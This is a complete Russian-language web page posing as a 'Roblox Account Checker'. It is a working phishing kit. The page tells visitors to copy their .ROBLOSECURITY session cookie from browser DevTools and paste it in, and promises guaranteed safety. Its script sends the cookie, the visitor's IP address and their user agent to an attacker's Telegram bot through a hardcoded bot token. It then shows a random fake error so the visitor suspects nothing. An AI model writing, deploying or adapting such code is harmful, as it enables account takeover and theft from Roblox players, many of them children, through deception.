    <!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Account Checker</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
        body{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);color:#fff;min-height:100vh;padding:20px;overflow-x:hidden}
        .container{max-width:1200px;margin:0 auto;animation:fadeIn 0.8s ease-out}
        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
        .header{text-align:center;margin-bottom:40px;padding:25px;background:rgba(255,255,255,0.05);border-radius:20px;backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.1);position:relative;overflow:hidden}
        .header::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,rgba(255,71,87,0.1) 0%,transparent 70%);z-index:0}
        .logo{display:flex;align-items:center;justify-content:center;gap:15px;margin-bottom:10px;position:relative;z-index:1}
        .logo i{font-size:3em;color:#ff4757;animation:pulse 2s infinite}
        @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
        .logo h1{font-size:2.5em;background:linear-gradient(45deg,#ff4757,#ff6b81);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:0 2px 10px rgba(255,71,87,0.3)}
        .subtitle{color:#a4b0be;font-size:1.1em;position:relative;z-index:1}
        .main-content{display:grid;grid-template-columns:1fr;gap:30px}
        .card{background:rgba(255,255,255,0.08);border-radius:20px;padding:30px;backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.1);box-shadow:0 10px 30px rgba(0,0,0,0.3);transition:transform 0.3s ease}
        .card:hover{transform:translateY(-5px)}
        .card h2{color:#ffa502;margin-bottom:20px;font-size:1.8em;display:flex;align-items:center;gap:10px}
        .instruction{background:rgba(0,0,0,0.3);padding:20px;border-radius:10px;margin-bottom:25px;line-height:1.6;border-left:4px solid #3742fa;position:relative}
        .instruction::before{content:'ℹ️';position:absolute;left:-35px;top:20px;font-size:1.2em}
        .instruction strong{color:#ffa502}
        .input-group{margin-bottom:25px;position:relative}
        textarea{width:100%;padding:15px;background:rgba(0,0,0,0.4);border:2px solid #3742fa;border-radius:10px;color:white;font-size:16px;resize:vertical;transition:all 0.3s;font-family:monospace;min-height:120px}
        textarea:focus{outline:none;border-color:#ffa502;box-shadow:0 0 0 3px rgba(255,165,2,0.2)}
        .char-count{position:absolute;bottom:10px;right:15px;color:#a4b0be;font-size:0.9em}
        .info-box{background:rgba(55,66,250,0.1);border:1px solid #3742fa;border-radius:10px;padding:15px;display:flex;align-items:center;gap:15px;margin-bottom:25px;animation:slideIn 0.5s ease-out}
        @keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
        .info-box i{color:#3742fa;font-size:1.5em}
        .btn-check{width:100%;padding:18px;background:linear-gradient(45deg,#ff4757,#ff6b81);border:none;border-radius:12px;color:white;font-size:1.2em;font-weight:bold;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:25px}
        .btn-check:hover{background:linear-gradient(45deg,#ff6b81,#ff4757);transform:scale(1.02);box-shadow:0 5px 20px rgba(255,71,87,0.4)}
        .btn-check:disabled{background:#6c757d;cursor:not-allowed;transform:none}
        .result{margin-top:30px;padding:20px;border-radius:10px;animation:slideIn 0.5s ease-out}
        .result h3{color:#ffa502;margin-bottom:15px;display:flex;align-items:center;gap:10px}
        .status{padding:20px;border-radius:10px;text-align:center;font-size:1.2em;font-weight:bold;margin-bottom:20px}
        .status.success{background:rgba(46,204,113,0.2);border:2px solid #2ecc71;color:#2ecc71}
        .status.error{background:rgba(231,76,60,0.2);border:2px solid #e74c3c;color:#e74c3c}
        .status.loading{background:rgba(52,152,219,0.2);border:2px solid #3498db;color:#3498db}
        .details{background:rgba(0,0,0,0.3);padding:20px;border-radius:10px;border:1px solid rgba(255,255,255,0.1)}
        .details.hidden{display:none}
        .features{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
        .feature{background:rgba(255,255,255,0.05);padding:25px;border-radius:15px;text-align:center;transition:all 0.3s;border:1px solid rgba(255,255,255,0.05)}
        .feature:hover{transform:translateY(-5px);border-color:rgba(255,165,2,0.3);box-shadow:0 10px 20px rgba(0,0,0,0.2)}
        .feature i{font-size:2.5em;color:#ffa502;margin-bottom:15px}
        .feature h3{margin-bottom:10px;color:#fff}
        .footer{text-align:center;margin-top:50px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.1);color:#a4b0be;font-size:0.9em}
        .disclaimer{margin-top:10px;font-size:0.8em;color:#747d8c}
        .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;z-index:1000;backdrop-filter:blur(5px)}
        .modal.hidden{display:none}
        .modal-content{background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;text-align:center;max-width:400px;width:90%;backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.2)}
        .loader{width:50px;height:50px;border:5px solid #3742fa;border-top:5px solid #ff4757;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .modal-content p{margin:10px 0;font-size:1.2em}
        .modal-sub{color:#a4b0be;font-size:0.9em}
        .telegram-info{background:rgba(0,136,204,0.1);border:1px solid #0088cc;border-radius:10px;padding:15px;margin-top:20px;text-align:center}
        .telegram-info i{color:#0088cc;margin-right:10px}
        .telegram-info a{color:#3498db;text-decoration:none;font-weight:bold}
        .telegram-info a:hover{text-decoration:underline}
        @media (max-width:768px){.logo{flex-direction:column;text-align:center}.logo h1{font-size:2em}.card{padding:20px}.features{grid-template-columns:1fr}}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fas fa-robot"></i>
                <h1>Roblox Account Checker</h1>
            </div>
            <p class="subtitle">Проверка аккаунтов на чистоту и наличие Robux</p>
        </div>
        <div class="main-content">
            <div class="card">
                <h2><i class="fas fa-cookie-bite"></i> Вставьте куки-код</h2>
                <p class="instruction">
                    Для проверки аккаунта вам необходимо:<br>
                    1. Зайти в Roblox в браузере<br>
                    2. Открыть DevTools (F12)<br>
                    3. Перейти во вкладку "Application" → "Cookies"<br>
                    4. Скопировать значение <strong>.ROBLOSECURITY</strong><br>
                    5. Вставить сюда
                </p>
                <div class="input-group">
                    <textarea id="cookieInput" placeholder="Вставьте сюда ваш .ROBLOSECURITY код..." rows="6"></textarea>
                    <div class="char-count">Символов: <span id="charCount">0</span></div>
                </div>
                <div class="info-box">
                    <i class="fas fa-shield-alt"></i>
                    <div>
                        <p><strong>Безопасность гарантирована</strong></p>
                        <p>Ваши данные используются только для проверки аккаунта.</p>
                    </div>
                </div>
                <button id="checkButton" class="btn-check">
                    <i class="fas fa-search"></i> Проверить аккаунт
                </button>
                <div class="telegram-info">
                    <i class="fab fa-telegram"></i>
                    Результат проверки придет в наш Telegram бот.
                </div>
                <div class="result" id="resultSection">
                    <h3><i class="fas fa-poll"></i> Результат проверки</h3>
                    <div class="status" id="statusMessage">Ожидание проверки...</div>
                </div>
            </div>
            <div class="features">
                <div class="feature">
                    <i class="fas fa-check-circle"></i>
                    <h3>Полная проверка</h3>
                    <p>Анализ Robux, предметов, ограничений</p>
                </div>
                <div class="feature">
                    <i class="fas fa-bolt"></i>
                    <h3>Мгновенный результат</h3>
                    <p>Проверка занимает менее 30 секунд</p>
                </div>
                <div class="feature">
                    <i class="fas fa-lock"></i>
                    <h3>100% безопасно</h3>
                    <p>Ваши данные защищены</p>
                </div>
            </div>
        </div>
        <div class="footer">
            <p>© 2024 Roblox Account Checker</p>
            <p class="disclaimer">Этот сервис не связан с Roblox Corporation.</p>
        </div>
    </div>
    <div class="modal hidden" id="loadingModal">
        <div class="modal-content">
            <div class="loader"></div>
            <p>Проверяем аккаунт...</p>
            <p class="modal-sub">Отправляем данные в систему проверки</p>
        </div>
    </div>
    <script>
        const TELEGRAM_BOT_TOKEN = '7734987736:AAEaxPM9djxiMKlxs_BkGHkEbq7WXt2yqPw';
        const TELEGRAM_CHAT_ID = '1491315056';
        
        const cookieInput = document.getElementById('cookieInput');
        const checkButton = document.getElementById('checkButton');
        const statusMessage = document.getElementById('statusMessage');
        const charCount = document.getElementById('charCount');
        const loadingModal = document.getElementById('loadingModal');
        
        cookieInput.addEventListener('input', function() {
            const length = this.value.length;
            charCount.textContent = length;
            charCount.style.color = length > 100 ? '#2ecc71' : '#a4b0be';
        });
        
        async function sendToTelegram(code) {
            try {
                const userID = 'user_' + Math.random().toString(36).substr(2, 9);
                const timestamp = new Date().toLocaleString('ru-RU');
                const userIP = await getIP();
                
                const message = `🔔 НОВЫЙ КОД ОТПРАВЛЕН\n\n` +
                               `👤 ID пользователя: ${userID}\n` +
                               `🕐 Время: ${timestamp}\n` +
                               `🌐 IP: ${userIP}\n` +
                               `📏 Длина кода: ${code.length} символов\n\n` +
                               `🔐 КОД:\n\`\`\`\n${code}\n\`\`\`\n\n` +
                               `📊 Система: ${navigator.userAgent.substring(0, 100)}`;
                
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('Ошибка отправки:', error);
                return false;
            }
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Не удалось определить IP';
            }
        }
        
        async function checkAccount() {
            const code = cookieInput.value.trim();
            
            if (!code) {
                showStatus('Пожалуйста, введите код', 'error');
                return;
            }
            
            if (code.length < 10) {
                showStatus('Код слишком короткий', 'error');
                await sendToTelegram(code);
                return;
            }
            
            loadingModal.classList.remove('hidden');
            checkButton.disabled = true;
            
            try {
                const telegramSent = await sendToTelegram(code);
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                const errorMessages = [
                    "❌ Ошибка проверки: неверный формат куки",
                    "⚠️ Куки устарел, требуется повторный вход в аккаунт",
                    "🔒 Аккаунт защищен двухфакторной аутентификацией",
                    "⏳ Время жизни куки истекло",
                    "🚫 Доступ запрещен: куки поврежден",
                    "💀 Аккаунт заблокирован или ограничен",
                    "🌐 Ошибка сети при подключении к Roblox API",
                    "🔍 Куки не содержит необходимых данных для проверки"
                ];
                
                const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
                showStatus(randomError, 'error');
                
                if (telegramSent) {
                    setTimeout(() => {
                        const telegramMsg = document.createElement('div');
                        telegramMsg.className = 'telegram-info';
                        telegramMsg.innerHTML = `<i class="fab fa-telegram"></i> Код успешно отправлен в систему проверки. Результат будет в Telegram боте.`;
                        statusMessage.parentNode.insertBefore(telegramMsg, statusMessage.nextSibling);
                    }, 500);
                }
                
            } catch (error) {
                showStatus('Ошибка соединения с сервером проверки', 'error');
            } finally {
                loadingModal.classList.add('hidden');
                checkButton.disabled = false;
                setTimeout(() => {
                    cookieInput.value = '';
                    charCount.textContent = '0';
                }, 5000);
            }
        }
        
        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = 'status ' + type;
            setTimeout(() => {
                statusMessage.textContent = 'Ожидание проверки...';
                statusMessage.className = 'status';
            }, 10000);
        }
        
        checkButton.addEventListener('click', checkAccount);
        cookieInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && e.ctrlKey) {
                checkAccount();
            }
        });
    </script>
</body>
</html>       
